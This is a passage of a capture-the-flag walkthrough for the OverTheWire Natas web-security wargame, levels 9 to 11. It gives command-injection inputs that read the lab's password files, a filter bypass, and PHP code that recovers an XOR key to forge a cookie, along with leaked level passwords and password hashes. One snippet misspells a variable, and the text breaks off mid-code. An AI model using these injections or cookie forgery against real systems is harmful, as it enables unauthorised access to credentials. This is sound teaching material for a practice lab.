+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+<span style="color:#111">&lt;</span><span style="color:#f92672">form</span> <span style="color:#75af00">method</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;post&#34;</span><span style="color:#111">&gt;</span>
+Input secret: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;secret&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
+
+<span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;viewsource&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index-source.html&#34;</span><span style="color:#111">&gt;</span>View sourcecode<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><h1 id="level-9">Level 9</h1>
+<p>Level 9 is tons of fun and we start to get a taste of how dangerous some vulnerabilities can be!</p>
+<p>We are greeted with an input field and more source code, again, straight to the source.
+Where we find:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">];</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$key</span> <span style="color:#f92672">!=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#75af00">passthru</span><span style="color:#111">(</span><span style="color:#d88200">&#34;grep -i </span><span style="color:#d88200">$key</span><span style="color:#d88200"> dictionary.txt&#34;</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>We can see, straight up <code>grep -i $key dictionary.txt</code> and <code>$key</code> is just taken from the request, no sanitization!
+Which means we can write anything there and it will execute with the <code>grep</code> command.</p>
+<h2 id="example">Example</h2>
+<p><code>http://natas9.natas.labs.overthewire.org/?needle=test&amp;submit=Search</code></p>
+<blockquote>
+<p>Will run the script with <code>$key=test</code>, resulting in the execution of <code>grep -i test dictionary.txt</code>.</p>
+</blockquote>
+<p><code>http://natas9.natas.labs.overthewire.org/?needle=.*&amp;submit=Search</code></p>
+<blockquote>
+<p>Yields <code>grep -i .* dictionary.txt</code>.</p>
+</blockquote>
+<p>There are several ways we can solve this level, however we will opt through the most straightforward way, given this yells <a href="https://www.owasp.org/index.php/Command_Injection">Command Injection</a>;
+Given we can write anything into the string what we want to do is to the escape from the <code>grep</code> command and execute interesting stuff.</p>
+<p>We can do that by writing:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">! dictionary.txt <span style="color:#111">;</span> cat /etc/natas_webpass/natas10<span style="color:#111">;</span> grep -i !
+</code></pre></div><p>Which results in the execution of the following command:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -i ! dictionary.txt <span style="color:#111">;</span> cat /etc/natas_webpass/natas10<span style="color:#111">;</span> grep -i ! dictionary.txt
+</code></pre></div><p>Breaking it down we can notice the same command in the beggining and the end.
+The usage of <code>!</code> is just so we don&rsquo;t get any matches from either <code>grep</code>&rsquo;s and the <code>dictionary.txt</code> that we add in the input is just to avoid <code>grep</code> crashing.
+The <code>;</code> allows us to write another command to execute after the first one finished,
+providing the ability to add the <code>cat /etc/natas_webpass/natas10</code> which will print the file.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
+Find words containing: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Search&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
+
+
+Output:
+<span style="color:#111">&lt;</span><span style="color:#f92672">pre</span><span style="color:#111">&gt;</span>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+<span style="color:#111">&lt;/</span><span style="color:#f92672">pre</span><span style="color:#111">&gt;</span>
+
+<span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;viewsource&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index-source.html&#34;</span><span style="color:#111">&gt;</span>View sourcecode<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
+</code></pre></div><p>Could this be done in a shorter way? Yes, however we will need it further down the road.</p>
+<h1 id="level-10">Level 10</h1>
+<p>Level 10 is the same gist, however, there is some user input &ldquo;sanitization&rdquo;.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">];</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$key</span> <span style="color:#f92672">!=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">preg_match</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/[;|&amp;]/&#39;</span><span style="color:#111">,</span><span style="color:#111">$key</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Input contains an illegal character!&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#75af00">passthru</span><span style="color:#111">(</span><span style="color:#d88200">&#34;grep -i </span><span style="color:#d88200">$key</span><span style="color:#d88200"> dictionary.txt&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>The characters <code>;</code>, <code>|</code> and <code>&amp;</code> are now disabled, but that won&rsquo;t stop us.
+Remember how I said that Level 9 could be done in a shorter way?</p>
+<p>Well, it turns out that <code>grep</code> can apply one regex to more than one file and that is what we are going to do.
+Right now we still have this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -i <span style="color:#111">$key</span> dictionary.txt
+</code></pre></div><p>And the input is filtered for some characters, however they didn&rsquo;t block <code>&quot;</code>, <code>*</code> or <code>.</code>,
+this way we can define <code>$key</code> as being a the regex and another file!</p>
+<p>Since now we want to match anything in order for the password to show up we will use <code>.*</code> and as a file,
+our dear and beloved <code>/etc/natas_webpass/natas11</code> and our input will look like</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.* /etc/natas_webpass/natas11
+</code></pre></div><p>If for some reason your output is not sorted by file and the one of the first files isn&rsquo;t the password, use <code>Ctrl + F</code>.
+Otherwise you probably got this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
+
+For security reasons, we now filter on certain characters<span style="color:#111">&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">form</span> <span style="color:#75af00">_lpchecked</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;1&#34;</span><span style="color:#111">&gt;</span>
+Find words containing: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Search&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;/</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
+
+
+Output:
+<span style="color:#111">&lt;</span><span style="color:#f92672">pre</span><span style="color:#111">&gt;</span>.htaccess:AuthType Basic
+.htaccess: AuthName &#34;Authentication required&#34;
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
+.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
+.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+...
+</code></pre></div><p>And there you have it!</p>
+<h1 id="level-11">Level 11</h1>
+<p>This one is a little harder. It&rsquo;s okay to ask for help!
+Especially with the nightmare that is PHP&hellip;</p>
+<p>For this one I recommend using either the PHP interpreter on your shell or just a online REPL.
+I used <a href="http://phpepl.herokuapp.com/">this</a>.</p>
+<p>The page greets you with a background color &ldquo;setter&rdquo;. It works, but for our purposes it&rsquo;s useless.
+As usual we will go through the source code and try to pretend we know how PHP works!</p>
+<p>This time the code is a little longer:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#111">$defaultdata</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">array</span><span style="color:#111">(</span> <span style="color:#d88200">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;no&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;#ffffff&#34;</span><span style="color:#111">);</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#111">$in</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&lt;censored&gt;&#39;</span><span style="color:#111">;</span>
+    <span style="color:#111">$text</span> <span style="color:#f92672">=</span> <span style="color:#111">$in</span><span style="color:#111">;</span>
+    <span style="color:#111">$outText</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&#39;</span><span style="color:#111">;</span>
+
+    <span style="color:#75715e">// Iterate through each character
+</span><span style="color:#75715e"></span>    <span style="color:#00a8c8">for</span><span style="color:#111">(</span><span style="color:#111">$i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#111">;</span><span style="color:#111">$i</span><span style="color:#f92672">&lt;</span><span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$text</span><span style="color:#111">);</span><span style="color:#111">$i</span><span style="color:#f92672">++</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#111">$outText</span> <span style="color:#f92672">.=</span> <span style="color:#111">$text</span><span style="color:#111">[</span><span style="color:#111">$i</span><span style="color:#111">]</span> <span style="color:#f92672">^</span> <span style="color:#111">$key</span><span style="color:#111">[</span><span style="color:#111">$i</span> <span style="color:#f92672">%</span> <span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$key</span><span style="color:#111">)];</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$outText</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">loadData</span><span style="color:#111">(</span><span style="color:#111">$def</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">global</span> <span style="color:#111">$_COOKIE</span><span style="color:#111">;</span>
+    <span style="color:#111">$mydata</span> <span style="color:#f92672">=</span> <span style="color:#111">$def</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;data&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_COOKIE</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#111">$tempdata</span> <span style="color:#f92672">=</span> <span style="color:#75af00">json_decode</span><span style="color:#111">(</span><span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#75af00">base64_decode</span><span style="color:#111">(</span><span style="color:#111">$_COOKIE</span><span style="color:#111">[</span><span style="color:#d88200">&#34;data&#34;</span><span style="color:#111">])),</span> <span style="color:#00a8c8">true</span><span style="color:#111">);</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">is_array</span><span style="color:#111">(</span><span style="color:#111">$tempdata</span><span style="color:#111">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;showpassword&#34;</span><span style="color:#111">,</span> <span style="color:#111">$tempdata</span><span style="color:#111">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;bgcolor&#34;</span><span style="color:#111">,</span> <span style="color:#111">$tempdata</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">if</span> <span style="color:#111">(</span><span style="color:#75af00">preg_match</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span style="color:#111">,</span> <span style="color:#111">$tempdata</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">]))</span> <span style="color:#111">{</span>
+                <span style="color:#111">$mydata</span><span style="color:#111">[</span><span style="color:#d88200">&#39;showpassword&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">$tempdata</span><span style="color:#111">[</span><span style="color:#d88200">&#39;showpassword&#39;</span><span style="color:#111">];</span>
+                <span style="color:#111">$mydata</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">$tempdata</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">];</span>
+            <span style="color:#111">}</span>
+        <span style="color:#111">}</span>
+    <span style="color:#111">}</span>
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$mydata</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">saveData</span><span style="color:#111">(</span><span style="color:#111">$d</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#75af00">setcookie</span><span style="color:#111">(</span><span style="color:#d88200">&#34;data&#34;</span><span style="color:#111">,</span> <span style="color:#75af00">base64_encode</span><span style="color:#111">(</span><span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#75af00">json_encode</span><span style="color:#111">(</span><span style="color:#111">$d</span><span style="color:#111">))));</span>
+<span style="color:#111">}</span>
+
+<span style="color:#111">$data</span> <span style="color:#f92672">=</span> <span style="color:#75af00">loadData</span><span style="color:#111">(</span><span style="color:#111">$defaultdata</span><span style="color:#111">);</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;bgcolor&#34;</span><span style="color:#111">,</span><span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">if</span> <span style="color:#111">(</span><span style="color:#75af00">preg_match</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">]))</span> <span style="color:#111">{</span>
+        <span style="color:#111">$data</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#39;bgcolor&#39;</span><span style="color:#111">];</span>
+    <span style="color:#111">}</span>
+<span style="color:#111">}</span>
+
+<span style="color:#75af00">saveData</span><span style="color:#111">(</span><span style="color:#111">$data</span><span style="color:#111">);</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Well, before we begin the page already told us that the cookies are XOR encrypted so we might as well read up on <a href="https://en.wikipedia.org/wiki/XOR_cipher">that</a>.</p>
+<p>The TL:DR is, if you want to encrypt <code>data</code> with a certain <code>key</code>, you XOR all their bits, if the key is too short, cycle it!
+Afterwards you get <code>encrypted_data</code> and to decrypt it you need to XOR it with <code>key</code>.</p>
+<p>Using our logical skills we can deduct that:</p>
+<pre><code>data XOR key = encrypted_data
+encrypted_data XOR key = data
+
+data XOR encrypted_data = key
+</code></pre><p>And it is in fact true.
+This means that even before analysing our code we can already construct a plan.</p>
+<ul>
+<li>Get the original data</li>
+<li>Get the encrypted data from the cookie</li>
+<li>XOR them to get the key</li>
+<li>???</li>
+<li>We got the password</li>
+</ul>
+<p>So first things first, lets take a look at the source, we already know what <code>xor_encrypt</code> does, so lets skip it.
+Before looking at the functions, we should see what the script will actually run!
+This starts with <code>$data = loadData($defaultdata);</code>, then if the <code>bgcolor</code> value exists, change the background to it and finally a call to <code>saveData($data);</code>.</p>
+<p>We are now ready to dive into it. Starting with <code>loadData($defaultdata)</code> and
+looking at <code>$defaultdata</code> for now it&rsquo;s just this weird array that is also a dictionary or whatever you kids call it these days.</p>
+<p>Entering the function we can see it defines two variables, a global one <code>$COOKIE</code>, which will be the cookie being used,
+and a local one <code>$mydata</code>, nothing more than a copy of <code>$def</code> (which is our <code>$defaultdata</code>).</p>
+<p>As we are able to see in <code>if(array_key_exists(&quot;data&quot;, $_COOKIE))</code>, it checks if the cookie exists before actually doing something,
+no big deal, however it is useful to identify what our cookie will look like!</p>
+<p>Afterwards, it defines a new variable:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#111">$tempdata</span> <span style="color:#f92672">=</span> <span style="color:#75af00">json_decode</span><span style="color:#111">(</span><span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#75af00">base64_decode</span><span style="color:#111">(</span><span style="color:#111">$_COOKIE</span><span style="color:#111">[</span><span style="color:#d88200">&#34;data&#34;</span><span style="color:#111">])),</span> <span style="color:#00a8c8">true</span><span style="color:#111">);</span>
+</code></pre></div><p>This is more interesting, we can see they are trying to hide it from plainsight! Or in this case, trying to decode it.
+It first uses <code>base64_decode</code> to decode the <code>Base64</code> string, then the <code>xor_encrypt</code> to decrypt the content and finally a <code>json_decode</code> and all this on the cookie!</p>
+<p>The code afterwards is just input validation and some logic for the color picker so we won&rsquo;t look at it (it&rsquo;s PHP anyway, don&rsquo;t feel bad).</p>
+<p>Before going back to the code, we need to see the cookie!
+Just like in the previous levels you should go to the Storage, etc, etc.</p>
+<p>When in there you&rsquo;ll see the cookie <code>data</code>, containing the value <code>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D</code> (the <code>%3D</code> can be removed).</p>
+<p>Now that we have our cookie, back to our code, we need to reverse the process, time to take matters into our hands!</p>
+<p>We know that the cookie we have is the result of all that processing applied to the <code>$defaultdata</code>.
+This way, we can XOR the original with the encrypted data to get the key!</p>
+<p>We&rsquo;ll do it like this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#75af00">php</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#111">$in</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#75af00">json_encode</span><span style="color:#111">(</span><span style="color:#00a8c8">array</span><span style="color:#111">(</span> <span style="color:#d88200">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;no&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;#ffffff&#34;</span><span style="color:#111">));</span>
+    <span style="color:#111">$text</span> <span style="color:#f92672">=</span> <span style="color:#111">$in</span><span style="color:#111">;</span>
+    <span style="color:#111">$outText</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&#39;</span><span style="color:#111">;</span>
+
+    <span style="color:#00a8c8">for</span><span style="color:#111">(</span><span style="color:#111">$i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#111">;</span><span style="color:#111">$i</span><span style="color:#f92672">&lt;</span><span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$text</span><span style="color:#111">);</span><span style="color:#111">$i</span><span style="color:#f92672">++</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#111">$outText</span> <span style="color:#f92672">.=</span> <span style="color:#111">$text</span><span style="color:#111">[</span><span style="color:#111">$i</span><span style="color:#111">]</span> <span style="color:#f92672">^</span> <span style="color:#111">$key</span><span style="color:#111">[</span><span style="color:#111">$i</span> <span style="color:#f92672">%</span> <span style="color:#75af00">strlen</span><span style="color:#111">(</span><span style="color:#111">$key</span><span style="color:#111">)];</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#00a8c8">return</span> <span style="color:#111">$outText</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+
+<span style="color:#111">$decoded_b64</span> <span style="color:#f92672">=</span> <span style="color:#75af00">base64_decode</span><span style="color:#111">(</span><span style="color:#d88200">&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&#34;</span><span style="color:#111">);</span>
+<span style="color:#111">$decrypted_key</span> <span style="color:#f92672">=</span> <span style="color:#75af00">xor_encrypt</span><span style="color:#111">(</span><span style="color:#111">$decoded_b64</span><span style="color:#111">);</span>
+<span style="color:#00a8c8">echo</span> <span style="color:#111">$decripted_key</span><span style="color:#111">;</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Note that we modified the key to be the JSON encoded value array!
+Running this will print <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>, notice the pattern?
+<code>qw8J</code> is the key! And now we can use it to encrypt the fake cookie!</p>
+<p>However, we don&rsquo;t yet know what to set show password to, logically it would be &ldquo;yes&rdquo; but we need to confirm.
+Turns out that bellow, in the form there&rsquo;s a little PHP script:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$data</span><span style="color:#111">[</span><span style="color:#d88200">&#34;showpassword&#34;</span><span style="color:#111">]</span> <span style="color:#f92672">==</span> <span style="color:#d88200">&#34;yes&#34;</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;The password for natas12 is &lt;censored&gt;&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+<span style="color:#111">}</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>So now we can build our cookie and encrypt it!
+Taking the code from before and making some changes.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#75af00">php</span>
+<span style="color:#00a8c8">function</span> <span style="color:#75af00">xor_encrypt</span><span style="color:#111">()</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;qw8J&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">$text</span> <span style="color:#f92672">=</span> <span style="color:#75af00">json_encode</span><span style="color:#111">(</span><span style="color:#00a8c8">array</span><span style="color:#111">(</span> <span style="color:#d88200">&#34;showpassword&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;yes&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;bgcolor&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#d88200">&#34;#ffffff&#34;</span><span style="color:#111">));</span>
+    <span style="color:#111">$outText</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;&#39;</span><span style="color:#111">;</span>
+
+    <span style="color:#75715e">// Iterate through each character
